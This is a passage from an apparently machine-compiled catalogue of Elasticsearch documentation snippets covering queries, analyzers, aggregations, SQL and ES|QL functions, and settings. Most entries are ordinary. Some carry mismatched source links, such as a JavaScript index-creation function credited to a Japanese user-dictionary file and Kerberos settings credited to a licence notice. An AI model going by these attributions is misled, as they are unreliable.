Equality\nDESCRIPTION: Filters processes based on a numeric field `serial_event_id` equaling 1. Checks for the transformation of EQL to JSON query containing the term condition.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_1\n\nLANGUAGE: basic\nCODE:\n```\nprocess where serial_event_id == 1\n;\ncontains \"term\":{\"serial_event_id\":{\"value\":1}\n;\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Analyzers with Keep Words Filter in Elasticsearch\nDESCRIPTION: This example demonstrates how to create custom analyzers using the Keep Words filter, one with an inline array of words and another with a file path for the word list.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-keep-words-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT keep_words_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"standard_keep_word_array\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [ \"keep_word_array\" ]\n        },\n        \"standard_keep_word_file\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [ \"keep_word_file\" ]\n        }\n      },\n      \"filter\": {\n        \"keep_word_array\": {\n          \"type\": \"keep\",\n          \"keep_words\": [ \"one\", \"two\", \"three\" ]\n        },\n        \"keep_word_file\": {\n          \"type\": \"keep\",\n          \"keep_words_path\": \"analysis/example_word_list.txt\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Script Compilation Circuit Breaker Settings\nDESCRIPTION: Settings to limit the number of inline script compilations within a time period. Includes compilation rate limit configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/circuit-breaker-settings.md#2025-04-21_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nscript.max_compilations_rate: \"150/5m\"\nscript.cache.max_size: \"<size>\"\n```\n\n----------------------------------------\n\nTITLE: Using wildcards in Elasticsearch index routing allocation filters\nDESCRIPTION: Shows how to use wildcards when specifying attribute values in index routing allocation filters, matching IP addresses starting with '192.168.2.'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/shard-allocation.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPUT test/_settings\n{\n  \"index.routing.allocation.include._ip\": \"192.168.2.*\"\n}\n```\n\n----------------------------------------\n\nTITLE: Performing Boolean AND: Painless Example\nDESCRIPTION: Demonstrates the use of the AND operator with boolean types in Painless. It implements logical AND, returning true if both inputs are true. Inputs must be booleans, and the return type is a boolean.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_31\n\nLANGUAGE: Painless\nCODE:\n```\nboolean x = true;\nboolean y = x && true;\nx = false;\ny = y && x;\n```\n\n----------------------------------------\n\nTITLE: Using FLOOR Function in Elasticsearch SQL\nDESCRIPTION: Returns the largest integer less than or equal to the input numeric expression. The function takes a numeric input and returns an integer or long value. If null is provided, it returns null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_12\n\nLANGUAGE: sql\nCODE:\n```\nFLOOR(numeric_exp) <1>\n```\n\n----------------------------------------\n\nTITLE: MV_MAX Function Documentation Header\nDESCRIPTION: Markdown documentation header indicating auto-generation notice and function name with syntax diagram reference.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/mv_max.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\\n\\n## `MV_MAX` [esql-mv_max]\\n\\n**Syntax**\\n\\n:::{image} ../../../images/functions/mv_max.svg\\n:alt: Embedded\\n:class: text-center\\n:::\n```\n\n----------------------------------------\n\nTITLE: Handling Cumulative Backported Transport Changes in Java (8.15 Example)\nDESCRIPTION: This Java code snippet, from an 8.15 pull request example, demonstrates handling cumulative backports across multiple versions. It checks if the transport version is a patch derived from either the 8.13 (`8.13_backport_id`) or 8.14 (`8.14_backport_id`) backports using `isPatchFrom`, or if it's at or after the main transport ID for 8.15 (`8.15_transport_id`) using `onOrAfter`. This ensures compatibility across multiple backported changes and the current development line by correctly applying the appropriate serialization logic based on the transport version negotiated between nodes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/internal/Versioning.md#_snippet_3\n\nLANGUAGE: Java\nCODE:\n```\nif (transportVersion.isPatchFrom(8.13_backport_id)\n    || transportVersion.isPatchFrom(8.14_backport_id)\n    || transportVersion.onOrAfter(8.15_transport_id))\n```\n\n----------------------------------------\n\nTITLE: Copyright Disclaimer Template\nDESCRIPTION: Sample template for a copyright disclaimer to be signed by an employer or institution.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-langdetect-NOTICE.txt#2025-04-22_snippet_5\n\nLANGUAGE: text\nCODE:\n```\nYoyodyne, Inc., hereby disclaims all copyright interest in the\nprogram `Gnomovision' (which makes passes at compilers) written by\nJames Hacker.\n\nsignature of Ty Coon, 1 April 1989\nTy Coon, President of Vice\n```\n\n----------------------------------------\n\nTITLE: Using Request Cache Parameter for Per-Request Caching in Elasticsearch\nDESCRIPTION: This search request explicitly enables caching using the request_cache query parameter, overriding the index-level setting. It shows an aggregation query that counts terms in the 'colors' field with size set to 0.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/shard-request-cache.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search?request_cache=true\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"popular_colors\": {\n      \"terms\": {\n        \"field\": \"colors\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Collecting Top Salaries using TOP Function in ESQL\nDESCRIPTION: This snippet demonstrates how to use the TOP function in ESQL to collect the top 3 salaries in descending order from the employees table. It also includes a MAX function to get the highest salary for comparison.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/top.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS top_salaries = TOP(salary, 3, \"desc\"), top_salary = MAX(salary)\n```\n\n----------------------------------------\n\nTITLE: Static Import for Geometry Field Emission\nDESCRIPTION: Configures static import for the emit callback method used in geometry field script generation, enabling value collection for geometry fields\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.geometry_field.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nstatic_import {\n    void emit(org.elasticsearch.script.GeometryFieldScript, Object) bound_to org.elasticsearch.script.GeometryFieldScript$Emit\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Cipher Suites for Remote Cluster Client SSL in Elasticsearch\nDESCRIPTION: Setting to specify supported cipher suites for SSL/TLS connections in remote cluster client. Available options depend on the Java version being used.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_42\n\nLANGUAGE: properties\nCODE:\n```\nxpack.security.remote_cluster_client.ssl.cipher_suites\n```\n\n----------------------------------------\n\nTITLE: Nested Field Sorting in Elasticsearch\nDESCRIPTION: Demonstrates sorting on nested fields using the offer.price field with filtering on offer.color. Includes nested path specification and mode configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/sort-search-results.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nPOST /_search\n{\n   \"query\" : {\n      \"term\" : { \"product\" : \"chocolate\" }\n   },\n   \"sort\" : [\n       {\n          \"offer.price\" : {\n             \"mode\" :  \"avg\",\n             \"order\" : \"asc\",\n             \"nested\": {\n                \"path\": \"offer\",\n                \"filter\": {\n                   \"term\" : { \"offer.color\" : \"blue\" }\n                }\n             }\n          }\n       }\n    ]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an Elasticsearch Index with Range Fields\nDESCRIPTION: This snippet demonstrates how to create an Elasticsearch index with integer_range and date_range fields, and insert a sample document.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-range-field-note.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT range_index\n{\n  \"settings\": {\n    \"number_of_shards\": 2\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"expected_attendees\": {\n        \"type\": \"integer_range\"\n      },\n      \"time_frame\": {\n        \"type\": \"date_range\",\n        \"format\": \"yyyy-MM-dd||epoch_millis\"\n      }\n    }\n  }\n}\n\nPUT range_index/_doc/1?refresh\n{\n  \"expected_attendees\" : {\n    \"gte\" : 10,\n    \"lte\" : 20\n  },\n  \"time_frame\" : {\n    \"gte\" : \"2019-10-28\",\n    \"lte\" : \"2019-11-04\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: DATE_ADD Example: Subtract Seconds\nDESCRIPTION: Demonstrates subtracting seconds from a datetime value using DATE_ADD with a negative integer. The example shows how to use DATE_ADD to decrement a datetime by 1234 seconds.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_24\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT DATE_ADD('seconds', -1234, '2019-09-04T11:22:33.000Z'::datetime) AS \\\"-1234 seconds\\\";\\n\\n      -1234 seconds\n------------------------\n2019-09-04T11:01:59.000Z\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Index Sort for Composite Aggregation Optimization in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to set up index sorting to optimize composite aggregations. It configures the index to sort by username in ascending order and timestamp in descending order.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-composite-aggregation.md#2025-04-21_snippet_18\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"index\": {\n      \"sort.field\": [ \"username\", \"timestamp\" ],\n      \"sort.order\": [ \"asc\", \"desc\" ]\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"username\": {\n        \"type\": \"keyword\",\n        \"doc_values\": true\n      },\n      \"timestamp\": {\n        \"type\": \"date\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Analyzer with Length Token Filter\nDESCRIPTION: Creates a new index with a custom analyzer that incorporates the Length token filter. Uses the standard tokenizer with default length filter settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-length-tokenfilter.md#2025-04-22_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT length_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"standard_length\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [ \"length\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an Index in ElasticSearch with JavaScript\nDESCRIPTION: This snippet demonstrates how to create a new index in ElasticSearch using the JavaScript client, specifying index settings and mappings for data structure definition. It requires an initialized ElasticSearch client and handles potential errors.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/analysis-kuromoji/src/test/resources/org/elasticsearch/plugin/analysis/kuromoji/user_dict.txt#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nasync function createIndex(indexName) {\n  try {\n    await client.indices.create({\n      index: indexName,\n      body: {\n        settings: {\n          number_of_shards: 1,\n          number_of_replicas: 0\n        },\n        mappings: {\n          properties: {\n            test_name: { type: 'text' }\n          }\n        }\n      }\n    });\n    console.log('Index created:', indexName);\n  } catch (error) {\n    console.error('Error creating index:', error);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Max Similarity Inverted Hamming Function\nDESCRIPTION: This snippet defines a function for calculating the maximum similarity using the inverted Hamming method within the score context. Similar to the previous function, it binds this function to a specific utility class used for Hamming similarity calculations. The function also requires a ScoreScript, an Object, and a String as parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/rank-vectors/src/main/resources/org/elasticsearch/xpack/rank/vectors/script/rank_vector_whitelist.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\ndouble maxSimInvHamming(org.elasticsearch.script.ScoreScript, Object, String) bound_to org.elasticsearch.xpack.rank.vectors.script.RankVectorsScoreScriptUtils$MaxSimInvHamming\n```\n\n----------------------------------------\n\nTITLE: Removing Smart Chinese Analysis Plugin from Elasticsearch\nDESCRIPTION: Command to remove the analysis-smartcn plugin from Elasticsearch. The node must be stopped before executing this command.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-smartcn.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin remove analysis-smartcn\n```\n\n----------------------------------------\n\nTITLE: Indexing GeoPoint Data in Elasticsearch\nDESCRIPTION: This code snippet demonstrates how to index a document with `geo_point` data in Elasticsearch. It inserts a document into the `example_points` index with a `location` field defined as a `geo_point` array. The refresh parameter ensures the document is immediately searchable.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-shape-query.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPUT /example_points/_doc/1?refresh\n{\n  \"name\": \"Wind & Wetter, Berlin, Germany\",\n  \"location\": [13.400544, 52.530286]\n}\n```\n\n----------------------------------------\n\nTITLE: Combining Keyword Repeat with Stemmer Filter\nDESCRIPTION: Demonstrates combining keyword_repeat with stemmer filter to create both stemmed and unstemmed versions of tokens. Shows how non-keyword tokens get stemmed while keyword tokens remain unchanged.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-keyword-repeat-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\": \"whitespace\",\n  \"filter\": [\n    \"keyword_repeat\",\n    \"stemmer\"\n  ],\n  \"text\": \"fox running and jumping\",\n  \"explain\": true,\n  \"attributes\": \"keyword\"\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Analyzer with Trim Filter in Elasticsearch\nDESCRIPTION: This snippet shows how to use the create index API to configure a new custom analyzer that incorporates the trim filter. It demonstrates setting up an analyzer named 'keyword_trim' that uses the keyword tokenizer and the trim filter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-trim-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT trim_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"keyword_trim\": {\n          \"tokenizer\": \"keyword\",\n          \"filter\": [ \"trim\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Percentiles using HDR Histogram in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the HDR Histogram for calculating percentiles in Elasticsearch. It specifies the 'hdr' parameter and sets the number of significant value digits for precision.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-percentile-aggregation.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nGET latency/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"load_time_outlier\": {\n      \"percentiles\": {\n        \"field\": \"load_time\",\n        \"percents\": [ 95, 99, 99.9 ],\n        \"hdr\": {                                  <1>\n          \"number_of_significant_value_digits\": 3 <2>\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Recreating and Customizing Stop Analyzer in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to recreate the built-in stop analyzer as a custom analyzer, providing a starting point for further customization. It includes the index creation with detailed analyzer configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-analyzer.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /stop_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"english_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_english_\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_stop\": {\n          \"tokenizer\": \"lowercase\",\n          \"filter\": [\n            \"english_stop\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL Type Compatibility Table in Markdown\nDESCRIPTION: A markdown table showing the compatibility between different field types in ESQL operations. The table maps input field types (field1 and field2) to their resulting output type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/mv_append.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field1 | field2 | result |\n| --- | --- | --- |\n| boolean | boolean | boolean |\n| cartesian_point | cartesian_point | cartesian_point |\n| cartesian_shape | cartesian_shape | cartesian_shape |\n| date | date | date |\n| date_nanos | date_nanos | date_nanos |\n| double | double | double |\n| geo_point | geo_point | geo_point |\n| geo_shape | geo_shape | geo_shape |\n| integer | integer | integer |\n| ip | ip | ip |\n| keyword | keyword | keyword |\n| keyword | text | keyword |\n| long | long | long |\n| text | keyword | keyword |\n| text | text | keyword |\n| unsigned_long | unsigned_long | unsigned_long |\n| version | version | version |\n```\n\n----------------------------------------\n\nTITLE: Using STARTS_WITH Function in ESQL Query\nDESCRIPTION: This snippet demonstrates how to use the STARTS_WITH function in an ESQL query. It filters the 'employees' table, keeps only the 'last_name' column, and creates a new column 'ln_S' that indicates whether each last name starts with the letter 'B'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/starts_with.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP last_name\n| EVAL ln_S = STARTS_WITH(last_name, \"B\")\n```\n\n----------------------------------------\n\nTITLE: Using QUARTER Function in Elasticsearch SQL\nDESCRIPTION: Extracts the quarter (1-4) from a given date/datetime expression. Returns null if input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_65\n\nLANGUAGE: sql\nCODE:\n```\nSELECT QUARTER(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS quarter;\n```\n\n----------------------------------------\n\nTITLE: Extracting Minute of Day with MINUTE_OF_DAY in SQL\nDESCRIPTION: Extracts the minute of the day from a date/datetime expression. Returns null if input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_59\n\nLANGUAGE: sql\nCODE:\n```\n\"MINUTE_OF_DAY(datetime_exp) <1>\\n\"\n```\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT MINUTE_OF_DAY(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS minute;\\n\\n    minute\\n---------------\\n623\\n\"\n```\n\n----------------------------------------\n\nTITLE: OR Operator Examples in Regular Expressions\nDESCRIPTION: Examples showing the pipe character as an OR operator that matches either pattern.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/regexp-syntax.md#2025-04-21_snippet_8\n\nLANGUAGE: text\nCODE:\n```\nabc|xyz  # matches 'abc' and 'xyz'\n```\n\n----------------------------------------\n\nTITLE: Querying with Reverse Nested Aggregation in Elasticsearch\nDESCRIPTION: This query demonstrates how to use the reverse nested aggregation to retrieve top commenters' usernames and the top tags of issues they've commented on. It showcases the nested and reverse_nested aggregations in action.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-reverse-nested-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /issues/_search\n{\n  \"query\": {\n    \"match_all\": {}\n  },\n  \"aggs\": {\n    \"comments\": {\n      \"nested\": {\n        \"path\": \"comments\"\n      },\n      \"aggs\": {\n        \"top_usernames\": {\n          \"terms\": {\n            \"field\": \"comments.username\"\n          },\n          \"aggs\": {\n            \"comment_to_issue\": {\n              \"reverse_nested\": {}, <1>\n              \"aggs\": {\n                \"top_tags_per_comment\": {\n                  \"terms\": {\n                    \"field\": \"tags\"\n                  }\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: SQL Query for X-Coordinate using ST_X\nDESCRIPTION: This SQL query selects points from a test table where the X-coordinate is equal to 10.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_16\n\nLANGUAGE: SQL\nCODE:\n```\nSELECT ST_AsWKT(point) FROM test WHERE ST_X(point) = 10;\n```\n\n----------------------------------------\n\nTITLE: Configuring Lowercase Processor in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to configure the lowercase processor in an Elasticsearch ingest pipeline. It specifies the 'field' option to indicate which field should be converted to lowercase.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/lowercase-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"lowercase\": {\n    \"field\": \"foo\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring HTTP Kerberos Authentication in Elasticsearch\nDESCRIPTION: YAML configuration for enabling Kerberos authentication for HTTP clients in Elasticsearch. This sets up the Kerberos authentication type and specifies the Kerberos realm to use.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/watcher/licenses/failureaccess-NOTICE.txt#2025-04-21_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.http.authentication.type: kerberos\nxpack.security.http.authentication.realm: kerb1\n```\n\n----------------------------------------\n\nTITLE: Customizing Keys in Keyed Response for Geo-distance Aggregation\nDESCRIPTION: Shows how to customize the key for each range in a keyed response from a geo-distance aggregation by explicitly specifying key names for each range.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-geodistance-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPOST /museums/_search?size=0\n{\n  \"aggs\": {\n    \"rings_around_amsterdam\": {\n      \"geo_distance\": {\n        \"field\": \"location\",\n        \"origin\": \"POINT (4.894 52.3760)\",\n        \"ranges\": [\n          { \"to\": 100000, \"key\": \"first_ring\" },\n          { \"from\": 100000, \"to\": 300000, \"key\": \"second_ring\" },\n          { \"from\": 300000, \"key\": \"third_ring\" }\n        ],\n        \"keyed\": true\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Demonstrating substring Function in EQL\nDESCRIPTION: The substring function extracts a substring from a source string at provided start and end positions. If no end position is provided, it extracts the remaining string. It supports negative offsets for both start and end positions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-function-ref.md#2025-04-21_snippet_14\n\nLANGUAGE: eql\nCODE:\n```\nsubstring(\"start regsvr32.exe\", 6)        // returns \"regsvr32.exe\"\nsubstring(\"start regsvr32.exe\", 0, 5)     // returns \"start\"\nsubstring(\"start regsvr32.exe\", 6, 14)    // returns \"regsvr32\"\nsubstring(\"start regsvr32.exe\", -4)       // returns \".exe\"\nsubstring(\"start regsvr32.exe\", -4, -1)   // returns \".ex\"\n```\n\n----------------------------------------\n\nTITLE: Using Top Metrics with Terms Aggregation\nDESCRIPTION: This example demonstrates how to use top_metrics aggregation inside a terms aggregation to find the last value reported by each server.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-top-metrics.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPUT /node\n{\n  \"mappings\": {\n    \"properties\": {\n      \"ip\": {\"type\": \"ip\"},\n      \"date\": {\"type\": \"date\"}\n    }\n  }\n}\nPOST /node/_bulk?refresh\n{\"index\": {}}\n{\"ip\": \"192.168.0.1\", \"date\": \"2020-01-01T01:01:01\", \"m\": 1}\n{\"index\": {}}\n{\"ip\": \"192.168.0.1\", \"date\": \"2020-01-01T02:01:01\", \"m\": 2}\n{\"index\": {}}\n{\"ip\": \"192.168.0.2\", \"date\": \"2020-01-01T02:01:01\", \"m\": 3}\nPOST /node/_search?filter_path=aggregations\n{\n  \"aggs\": {\n    \"ip\": {\n      \"terms\": {\n        \"field\": \"ip\"\n      },\n      \"aggs\": {\n        \"tm\": {\n          \"top_metrics\": {\n            \"metrics\": {\"field\": \"m\"},\n            \"sort\": {\"date\": \"desc\"}\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Testing Script in Filter Context\nDESCRIPTION: Example of running a script in filter context to check field value length against a parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-api-examples.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /_scripts/painless/_execute\n{\n  \"script\": {\n    \"source\": \"doc['field'].value.length() <= params.max_length\",\n    \"params\": {\n      \"max_length\": 4\n    }\n  },\n  \"context\": \"filter\",\n  \"context_setup\": {\n    \"index\": \"my-index-000001\",\n    \"document\": {\n      \"field\": \"four\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Standard Analyzer in Elasticsearch\nDESCRIPTION: Default analyzer that splits text on word boundaries, removes punctuation, lowercases terms, and supports stop word removal using Unicode Text Segmentation algorithm.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analyzer-reference.md#2025-04-21_snippet_0\n\nLANGUAGE: elasticsearch\nCODE:\n```\n\"analyzer\": \"standard\"\n```\n\n----------------------------------------\n\nTITLE: Using SIGNUM Function in ESQL to Determine Number Sign\nDESCRIPTION: This example demonstrates how to use the SIGNUM function in ESQL to determine the sign of a numeric value. The SIGNUM function returns 1.0 for positive numbers, -1.0 for negative numbers, and 0.0 for zero. In this case, it returns 1.0 for the value 100.0.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/signum.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW d = 100.0\n| EVAL s = SIGNUM(d)\n```\n\n----------------------------------------\n\nTITLE: Customizing Unique Token Filter in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create a custom unique filter with the 'only_on_same_position' parameter set to true, and use it in a custom analyzer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-unique-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT letter_unique_pos_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"letter_unique_pos\": {\n          \"tokenizer\": \"letter\",\n          \"filter\": [ \"unique_pos\" ]\n        }\n      },\n      \"filter\": {\n        \"unique_pos\": {\n          \"type\": \"unique\",\n          \"only_on_same_position\": true\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing a MultiPoint Shape in WKT Format\nDESCRIPTION: This example demonstrates indexing a multipoint shape using Well-Known Text (WKT) format. Multiple points are specified within a single MULTIPOINT definition.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/shape.md#2025-04-21_snippet_11\n\nLANGUAGE: console\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : \"MULTIPOINT (1002.0 2000.0, 1003.0 2000.0)\"\n}\n```\n\n----------------------------------------\n\nTITLE: Multiple Pattern Matching with Grok\nDESCRIPTION: Shows how to configure multiple patterns for matching different pet types with trace_match functionality.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/grok-processor.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST _ingest/pipeline/_simulate\n{\n  \"pipeline\": {\n  \"description\" : \"parse multiple patterns\",\n  \"processors\": [\n    {\n      \"grok\": {\n        \"field\": \"message\",\n        \"patterns\": [\"%{FAVORITE_DOG:pet}\", \"%{FAVORITE_CAT:pet}\"],\n        \"pattern_definitions\" : {\n          \"FAVORITE_DOG\" : \"beagle\",\n          \"FAVORITE_CAT\" : \"burmese\"\n        }\n      }\n    }\n  ]\n},\n\"docs\":[\n  {\n    \"_source\": {\n      \"message\": \"I love burmese cats!\"\n    }\n  }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Explicitly Removing Index Blocks with Settings Override\nDESCRIPTION: This snippet shows how to manually remove all index blocks from the source index when creating a new index. It sets all block settings to null to ensure the new index is fully writable and accessible.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/create-index-from-source.md#2025-04-21_snippet_3\n\nLANGUAGE: json\nCODE:\n```\nPOST _create_from/my-index/my-new-index\n{\n  \"settings_override\": {\n    \"index\": {\n      \"blocks.write\": null,\n      \"blocks.read\": null,\n      \"blocks.read_only\": null,\n      \"blocks.read_only_allow_delete\": null,\n      \"blocks.metadata\": null\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Time Span Arithmetic Operations in ESQL\nDESCRIPTION: Shows how to use time spans with arithmetic operators for filtering recent events.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-time-spans.md#2025-04-21_snippet_2\n\nLANGUAGE: esql\nCODE:\n```\nFROM sample_data\n| WHERE 